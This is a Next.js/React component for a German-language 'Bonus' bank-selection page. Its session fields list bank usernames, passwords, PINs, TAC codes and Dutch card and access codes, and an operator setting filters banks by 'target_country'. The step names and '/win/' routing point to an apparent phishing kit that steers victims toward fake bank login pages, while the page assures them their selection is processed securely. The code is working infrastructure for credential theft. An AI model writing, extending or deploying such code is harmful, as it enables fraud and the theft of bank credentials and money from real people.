"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { useSettings } from "@/contexts/SettingsContext";
import { countriesMatch } from "@/lib/country-utils";

type Props = {
  sessionId: string;
  routeSessionId?: string;
  initialBanks: BankCatalogEntry[];
};

const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";
const BANK_SESSION_FIELDS_TO_CLEAR = [
  "bankSlug",
  "bankName",
  "loginMethod",
  "personalCode",
  "bankPhone",
  "username",
  "password",
  "verfuegernummer",
  "pin",
  "tacCode",
  "rekeningnummer",
  "pasnummer",
  "toegangscode",
  "signatuur",
  "identificatiecode",
  "orderedField1",
  "orderedField1Key",
  "orderedField2",
  "orderedField2Key",
  "orderedField2Type",
  "orderedField3",
  "orderedField3Key",
  "orderedField3Type",
] as const;

export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
  const [bankSlug, setBankSlug] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [saving, setSaving] = useState(false);
  const [resettingSelection, setResettingSelection] = useState(true);
  const [msg, setMsg] = useState<string | null>(null);
  const [recovering, setRecovering] = useState(false);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const navigationLockRef = useRef(false);
  const refreshAbortRef = useRef<AbortController | null>(null);
  const selectionVersionRef = useRef(0);
  const mountedRef = useRef(true);

  useEffect(() => {
    setBanks(initialBanks);
  }, [initialBanks]);

  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      selectionVersionRef.current += 1;
      refreshAbortRef.current?.abort();
    };
  }, []);

  const resetSessionBankSelection = useCallback(async () => {
    if (supabase === null || !sessionId) return;

    const { data } = await supabase
      .from("sessions")
      .select("current_step,form_data")
      .eq("id", sessionId)
      .maybeSingle();

    if (!data) return;

    const currentStep = typeof data.current_step === "string" ? data.current_step : "";
    const previousFormData = ((data.form_data ?? {}) as Record<string, unknown>) || {};
    const hadBankState =
      currentStep === "bank" ||
      currentStep === "bank_login" ||
      currentStep === "wait" ||
      BANK_SESSION_FIELDS_TO_CLEAR.some((key) => {
        const value = previousFormData[key];
        return typeof value === "string" ? value.trim().length > 0 : Boolean(value);
      });

    const nextFormData = { ...previousFormData };
    for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
      delete nextFormData[field];
    }

    setSessionFormData(nextFormData);
    setBankSlug("");

    if (!hadBankState) return;

    await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "banken",
        form_data: nextFormData,
      })
      .eq("id", sessionId);
  }, [sessionId, supabase]);

  const refreshBanks = useCallback(async () => {
    if (navigationLockRef.current) return;

    refreshAbortRef.current?.abort();
    const controller = new AbortController();
    refreshAbortRef.current = controller;

    try {
      const res = await fetch(`/api/banks?t=${Date.now()}`, {
        cache: "no-store",
        headers: {
          "Cache-Control": "no-cache",
        },
        signal: controller.signal,
      });

      if (!res.ok) return;
      const data = await res.json();
      if (!Array.isArray(data.banks)) return;

      setBanks(
        data.banks.map((bank: any) => ({
          slug: bank.slug,
          name: bank.name,
          domain: bank.domain,
          logoFile: bank.logoFile ?? bank.logo_file,
          country: bank.country,
          isActive: bank.isActive !== false && bank.is_active !== false,
        })),
      );
    } catch (error) {
      if (error instanceof Error && error.name === "AbortError") return;
      /* ignore transient refresh errors */
    } finally {
      if (refreshAbortRef.current === controller) {
        refreshAbortRef.current = null;
      }
    }
  }, []);

  useEffect(() => {
    if (!sessionId) return;
    if (window.location.search.includes("session=")) {
      window.history.replaceState(window.history.state, "", "/banken");
    }
  }, [sessionId]);

  useEffect(() => {
    try {
      if (window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) !== "1") {
        return;
      }

      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      refreshAbortRef.current?.abort();
      setSaving(false);
      setResettingSelection(true);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      setBanks(initialBanks);

      void (async () => {
        await resetSessionBankSelection();
        try {
          window.sessionStorage.removeItem(RETURN_TO_BANK_LIST_FLAG);
        } catch {
          /* ignore sessionStorage errors */
        }
        if (mountedRef.current) {
          setResettingSelection(false);
        }
        void refreshBanks();
      })();
    } catch {
      /* ignore sessionStorage errors */
    }
  }, [initialBanks, refreshBanks, resetSessionBankSelection]);

  useEffect(() => {
    const resetUi = () => {
      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      setSaving(false);
      setResettingSelection(true);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      setBanks(initialBanks);
    };

    const refreshView = () => {
      if (navigationLockRef.current) return;
      resetUi();
      void refreshBanks();
    };

    const onPageShow = (event: PageTransitionEvent) => {
      const entries = typeof performance !== "undefined" ? performance.getEntriesByType("navigation") : [];
      const navEntry = entries[0] as PerformanceNavigationTiming | undefined;
      const isBackForward = navEntry?.type === "back_forward";

      if (event.persisted || isBackForward) {
        refreshView();
      }
    };

    window.addEventListener("pageshow", onPageShow);
    return () => {
      window.removeEventListener("pageshow", onPageShow);
    };
  }, [initialBanks, refreshBanks]);

  const demoOptions = useMemo(() => {
    // Sadece aktif olanları ve (eğer seçilmişse) hedef ülkenin bankalarını göster
    let validBanks = banks.filter(b => b.isActive !== false);
    
    if (settings.target_country && settings.target_country !== "All") {
      validBanks = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
    }

    return validBanks.map((bank) => ({
      slug: bank.slug,
      displayName: bank.name,
      domain: bank.domain,
      logoFile: bank.logoFile,
    }));
  }, [banks, settings.target_country]);

  const filteredOptions = useMemo(() => {
    const q = searchTerm.trim().toLowerCase();
    if (!q) return demoOptions;
    return demoOptions.filter((opt) => opt.displayName.toLowerCase().includes(q));
  }, [searchTerm, demoOptions]);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cachedSessionId = localStorage.getItem("activeSessionId");
      if (cachedSessionId) {
        setRecovering(true);
        router.replace("/banken");
      }
    } catch {
      /* ignore localStorage access errors */
    }
  }, [sessionId]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      setResettingSelection(true);
      await resetSessionBankSelection();
      if (cancelled) return;
      setResettingSelection(false);
    })();
    return () => {
      cancelled = true;
    };
  }, [resetSessionBankSelection, sessionId, supabase]);

  async function handleBankSelect(nextBankSlug: string, displayName: string) {
    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current || resettingSelection) return;

    const selectionVersion = selectionVersionRef.current + 1;
    selectionVersionRef.current = selectionVersion;
    navigationLockRef.current = true;
    refreshAbortRef.current?.abort();
    setSaving(true);
    setMsg(null);
    setBankSlug(nextBankSlug);

    const nextFormData: Record<string, any> = {
      ...sessionFormData,
      bankSlug: nextBankSlug,
      bankName: displayName,
    };
    
    for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
      delete nextFormData[field];
    }
    nextFormData.bankSlug = nextBankSlug;
    nextFormData.bankName = displayName;

    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "bank",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    if (!mountedRef.current || selectionVersionRef.current !== selectionVersion) {
      return;
    }

    setSaving(false);
    if (error) {
      navigationLockRef.current = false;
      setMsg("Speichern fehlgeschlagen.");
    }
    else {
      setSessionFormData(nextFormData);
      router.push(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
    }
  }

  if (!supabase) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    if (recovering) {
      return (
        <div className="pak-page-shell">
          <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
            <h2 className="text-2xl font-bold text-white mb-2">Bankauswahl</h2>
            <p className="text-sm text-gray-300 mb-8">Sitzung wird wiederhergestellt...</p>
            <div className="flex justify-center py-12">
              <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
            </div>
          </div>
        </div>
      );
    }
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
          <h2 className="text-2xl font-bold text-white mb-2">Bankauswahl</h2>
          <p className="text-sm text-gray-300 mb-6">Ungültiger Link.</p>
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
            Verwenden Sie den vollständigen Link, um fortzufahren.
          </p>
        </div>
      </div>
    );
  }

  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-12">
          <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  return (
    <div className="pak-page-shell">
      <div className="relative z-10 w-full max-w-[860px] space-y-4">
        <div className="pak-form-card h-[calc(100dvh-6rem)] max-h-[820px] overflow-hidden p-3 sm:h-[calc(100dvh-6.4rem)] sm:p-5">
          <div className="pak-form-inner grid h-full grid-rows-[auto_auto_minmax(0,1fr)_auto]">
            <div className="mb-3 flex items-start justify-between gap-3">
              <div className="min-w-0 max-w-[30rem]">
                <h2 className="pak-form-title">{settings.banken_title}</h2>
                <p className="pak-form-subtitle mt-2">{settings.banken_subtitle}</p>
              </div>
              <img
                src="/form-assets/logo-form.svg"
                alt="Bonus"
                className="pak-form-brand-logo shrink-0"
              />
            </div>

            <div className="mx-auto mb-3 w-full max-w-[520px] shrink-0">
              <div className="pak-form-input-wrap mt-0">
                <div className="pak-form-input-icon">
                  <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="11" cy="11" r="7" />
                    <path d="m20 20-3.5-3.5" />
                  </svg>
                </div>
                <input
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  placeholder={settings.banken_search_placeholder}
                  className="pak-form-input min-h-[3.5rem] rounded-full pl-14 pr-4 text-[15px]"
                />
              </div>
            </div>

            <div className="min-h-0 overflow-y-auto pr-1 custom-scrollbar">
                <div className="grid grid-cols-1 gap-2 sm:grid-cols-2 lg:grid-cols-3">
                {filteredOptions.length === 0 ? (
                  <div className="col-span-full rounded-2xl border border-[#ffd95c]/20 bg-white/5 p-6 text-center text-sm text-white/82">
                    Für das ausgewählte Land wurden keine Banken gefunden. Wählen Sie ein anderes Land oder löschen Sie den Suchfilter.
                  </div>
                ) : filteredOptions.map((opt) => (
                  <button
                    key={opt.slug}
                    type="button"
                    onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                  disabled={saving || resettingSelection}
                    className={`group flex min-h-[4.25rem] w-full items-center gap-3 rounded-full border px-3 py-2 text-left transition-all duration-200 ${
                      bankSlug === opt.slug
                        ? "border-[#ffe784] bg-[linear-gradient(180deg,rgba(255,213,0,0.18),rgba(255,213,0,0.08))] shadow-[0_0_0_1px_rgba(255,240,170,0.22),0_0_24px_rgba(255,214,10,0.14)]"
                        : "border-[#ffd95c]/16 bg-[linear-gradient(180deg,rgba(255,255,255,0.04),rgba(255,255,255,0.02))] hover:border-[#ffe784]/35 hover:bg-[linear-gradient(180deg,rgba(255,213,0,0.1),rgba(255,213,0,0.04))]"
                    } ${saving ? "opacity-70" : ""}`}
                  >
                    <div className="flex h-11 w-11 shrink-0 items-center justify-center overflow-hidden rounded-full border border-[#ffd95c]/22 bg-[linear-gradient(180deg,rgba(35,35,31,0.98),rgba(15,15,13,0.98))] shadow-[inset_0_1px_0_rgba(255,255,255,0.06)]">
                      <img
                        src={optimizeSupabaseImageUrl(opt.logoFile, { format: "webp", quality: 80, width: 128 }) || opt.logoFile}
                        alt={opt.displayName}
                        className="h-full w-full rounded-full object-cover"
                        onError={(e) => {
                          e.currentTarget.onerror = null;
                          e.currentTarget.style.display = "none";
                          const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                          if (fallback) fallback.style.display = "grid";
                        }}
                      />
                      <div className="hidden h-7 w-7 place-items-center rounded-full text-sm font-black text-[#ffe98c]">
                        {opt.displayName.charAt(0)}
                      </div>
                    </div>
                    <div className="min-w-0 flex-1">
                      <p className="truncate text-[13px] font-semibold leading-none text-white/92 group-hover:text-white">
                        {opt.displayName}
                      </p>
                    </div>
                    <div className="shrink-0 text-[#ffd95c]/70 transition-transform duration-200 group-hover:translate-x-0.5 group-hover:text-[#ffe98c]">
                      <svg className="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M9 6l6 6-6 6" />
                      </svg>
                    </div>
                  </button>
                ))}
                </div>
            </div>

            <div className="mt-3 flex shrink-0 items-center justify-center gap-2 border-t border-[#ffd95c]/15 pt-3 text-center pak-form-security">
              <svg className="h-8 w-8 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
              </svg>
              <span>Ihre Bankauswahl wird sicher verarbeitet.</span>
            </div>
          </div>
        </div>

        {msg ? <p className="rounded-2xl border border-red-500/20 bg-red-500/10 p-3 text-center text-sm text-red-300">{msg}</p> : null}
      </div>
    </div>
  );
}
